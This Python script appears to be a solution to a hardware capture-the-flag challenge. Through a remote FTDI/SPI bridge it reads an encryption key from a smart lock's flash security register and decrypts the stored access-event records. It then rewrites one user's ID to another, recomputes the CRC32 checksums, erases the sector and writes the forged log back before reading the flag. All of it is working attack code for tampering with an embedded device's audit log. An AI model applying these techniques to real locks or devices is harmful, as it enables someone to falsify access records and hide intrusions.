import socket
import json
import struct
import ctypes
import binascii

# https://docs.rs-online.com/9bfc/0900766b81704060.pdf

FLAG_ADDRESS = [0x52, 0x52, 0x52]

DEBUG = False
RECORDS_SIZE = 2560

# Configure according to your setup
host = '83.136.249.153'  # The server's hostname or IP address
port = 55290             # The port used by the server
cs=0                     # /CS on A*BUS3 (range: A*BUS3 to A*BUS7)
usb_device_url = 'ftdi://ftdi:2232h/1'

def exchange(hex_list, value=0):
    # Convert hex list to strings and prepare the command data
    command_data = {
        "tool": "pyftdi",
        "cs_pin":  cs,
        "url":  usb_device_url,
        "data_out": [hex(x) for x in hex_list],  # Convert hex numbers to hex strings
        "readlen": value
    }

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        # Serialize data to JSON and send
        s.sendall(json.dumps(command_data).encode('utf-8'))

        # Receive and process response
        data = b''
        while True:
            data += s.recv(1024)
            if data.endswith(b']'):
                break

        response = json.loads(data.decode('utf-8'))

    return response

def debug_print_data_raw(data):
    for i, b in enumerate(data):
        print(f"{b:02X}", end=" ")
        if (i+1)%16 == 0: print()
    print()

def flash_wait_busy():
    if DEBUG:
        print("[SYNC]")
    while True:
        status = exchange([0x05], 1)[0]
        if status & 1 == 0:
            break

def flash_write_enable():
    res = exchange([0x06], 1)
    if DEBUG:
        print(f"[WEL]\n{res}")

def flash_write_disable():
    res = exchange([0x04], 1)
    if DEBUG:
        print(f"[WEL]\n{res}")

def flash_sector_erase(addr):
    flash_write_enable()

    cmd = [0] * 4
    cmd[0] = 0x20
    cmd[1] = (addr >> 16) & 0xff
    cmd[2] = (addr >> 8)  & 0xff
    cmd[3] = (addr >> 0)  & 0xff

    exchange(cmd, 1)
    flash_wait_busy()

def read_encryption_key():
    return bytearray(exchange([0x48, 0, 16, 0x52, 0, 0], 12))

def read_data(length, addr):
    flash_write_disable()

    cmd = [0] * 4
    cmd[0] = 0x03
    cmd[1] = (addr >> 16) & 0xff
    cmd[2] = (addr >> 8)  & 0xff
    cmd[3] = (addr >> 0)  & 0xff

    data = bytearray(exchange(cmd, length))

    if DEBUG:
        print("[READ]")
        debug_print_data_raw(data)

    return data

def write_data(data, addr):
    flash_write_enable()

    cmd = [0] * 4
    cmd[0] = 0x02
    cmd[1] = (addr >> 16) & 0xff
    cmd[2] = (addr >> 8)  & 0xff
    cmd[3] = (addr >> 0)  & 0xff

    for b in data:
        cmd.append(b)

    exchange(cmd, len(data))

    flash_wait_busy()

    if DEBUG:
        print("[WRITE]")
        debug_print_data_raw(data)

def process_data(data, key, /, modify, dump):
    # data records are 16 bytes each
    # 12 bytes 'SmartLockEvent' struct data
    #  4 bytes crc32
    for i in range(0, len(data), 16):
        record = bytearray([data[x] for x in range(i,i+12)])

        # decrypt record data (crc is not encrypted)
        for j in range(0, 12):
            record[j] = record[j] ^ key[j%len(key)]

        timestamp = struct.unpack_from("<I", record, offset=0)[0]
        event_id = record[4]
        user_id = struct.unpack_from("<H", record, offset=6)[0]
        method = record[8]
        success = record[9]
        crc = struct.unpack_from("<I", data, offset=i+12)[0]

        # unpack data for debug print
        if dump == True:
            print(f"[{i:04d}]: {timestamp}, {event_id:03d}, {user_id:04X}, {method}, {success}, {crc:08X}")

        # modify the user with id 0x5244 to target another user
        if modify == True and user_id == 0x5244:
            struct.pack_into("<H", record, 6, 944)
            crc = binascii.crc32(record)
            for j in range(len(record)):
                data[i+j] = record[j] ^ key[j%len(key)]
            struct.pack_into("<I", data, i+12, crc)

if __name__ == "__main__":
    key = read_encryption_key()

    records = read_data(RECORDS_SIZE, 0)

    process_data(records, key, modify = False, dump = True)

    # process data and modify user records
    process_data(records, key, modify = True, dump = False)

    if DEBUG == True:
        # just dump the processed data to check everything is fine
        process_data(records, key, modify = False, dump = True)

    # erase first sector (4k memory)
    flash_sector_erase(0)

    # write modified data back to sector. writes need to happen in
    # 256 block granularity
    block_size = 16*16
    for i in range(0, RECORDS_SIZE//block_size):
        offset = i*block_size
        write_data(records[offset:offset+block_size], offset)

    # read flag
    addr = (FLAG_ADDRESS[0] << 16) | (FLAG_ADDRESS[1] << 8) | FLAG_ADDRESS[2]
    flag = read_data(100, addr)
    print(flag.strip(b"\xff").decode())